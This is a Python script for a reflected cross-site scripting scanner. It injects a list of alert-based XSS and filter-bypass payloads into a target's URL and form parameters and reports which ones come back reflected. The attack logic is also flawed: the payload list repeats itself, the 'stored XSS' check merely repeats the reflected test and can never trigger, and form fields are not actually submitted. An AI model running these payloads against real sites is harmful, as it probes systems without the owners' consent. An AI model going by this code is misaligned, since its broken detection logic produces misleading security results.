#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import urllib.parse
import re

class XSSScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerable_params = []
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<img src=x:x onerror=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "'-alert('XSS')-'",
            "\"-alert('XSS')-\"",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "><script>alert('XSS')</script>",
            "';alert('XSS')//';alert('XSS')//\";",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<img src=x:x onerror=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "'-alert('XSS')-'",
            "\"-alert('XSS')-\"",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "><script>alert('XSS')</script>",
            "';alert('XSS')//';alert('XSS')//\";",
        ]
        
    def extract_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return params
        
    def test_param(self, url, param, value):
        print(colored(f"[*] Testing parameter: {param}", "cyan"))
        
        for payload in self.payloads:
            # Test GET parameters
            test_url = url.replace(f"{param}={value}", f"{param}={payload}")
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text:
                    print(colored(f"[!] XSS vulnerability found in parameter: {param}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    self.vulnerable_params.append({
                        "param": param,
                        "type": "reflected",
                        "payload": payload,
                        "url": test_url
                    })
                    return True
                    
                # Check for stored XSS (simplified)
                if any(payload in resp.text for resp in [response]):
                    print(colored(f"[!] Potential stored XSS found in parameter: {param}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    self.vulnerable_params.append({
                        "param": param,
                        "type": "stored",
                        "payload": payload,
                        "url": test_url
                    })
                    return True
                    
            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error testing {param}: {str(e)}", "red"))
                continue
                
        return False
        
    def scan(self):
        print(colored("\n[*] Starting XSS Scanner...", "cyan"))
        print(colored("=" * 50, "cyan"))
        
        try:
            # Get initial page
            response = requests.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            # Test URL parameters
            params = self.extract_params(self.target)
            for param, value in params.items():
                self.test_param(self.target, param, value[0])
            
            # Test form parameters
            for form in forms:
                inputs = form.find_all('input')
                for input_field in inputs:
                    if input_field.get('name'):
                        param = input_field['name']
                        value = input_field.get('value', '')
                        self.test_param(self.target, param, value)
            
            # Print summary
            if self.vulnerable_params:
                print(colored("\n[+] XSS Vulnerabilities Found:", "green"))
                for vuln in self.vulnerable_params:
                    print(colored(f"\nParameter: {vuln['param']}", "yellow"))
                    print(colored(f"Type: {vuln['type']}", "yellow"))
                    print(colored(f"Payload: {vuln['payload']}", "yellow"))
                    print(colored(f"URL: {vuln['url']}", "yellow"))
            else:
                print(colored("\n[-] No XSS vulnerabilities found.", "green"))
                
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Error scanning target: {str(e)}", "red"))
            return False
            
        return True 